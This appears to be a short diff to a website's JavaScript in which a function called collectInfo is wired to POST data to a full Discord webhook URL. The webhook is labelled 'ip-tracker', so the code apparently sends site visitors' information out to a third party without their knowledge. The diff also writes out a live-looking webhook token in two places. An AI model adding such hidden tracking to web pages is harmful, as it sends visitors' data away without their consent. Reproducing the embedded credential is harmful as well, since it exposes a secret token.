@@ -161,13 +161,13 @@ for (let i = 0; i < navigationLinks.length; i++) {
 function collectInfo(json) {
   var wbRequest = new XMLHttpRequest();
 
-  wbRequest.open("POST", "WEBHOOK LINK");
+  wbRequest.open("POST", "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y");
 
   wbRequest.setRequestHeader('Content-type', 'application/json');
 
   var params = {
-    username: "DISCORD WEBHOOK NICKNAME",
-    avatar_url: "DISCORD WEBHOOK URL",
+    username: "ip-tracker",
+    avatar_url: "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y",
     content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
     embeds: [{
       title: "EMBED TITLE",
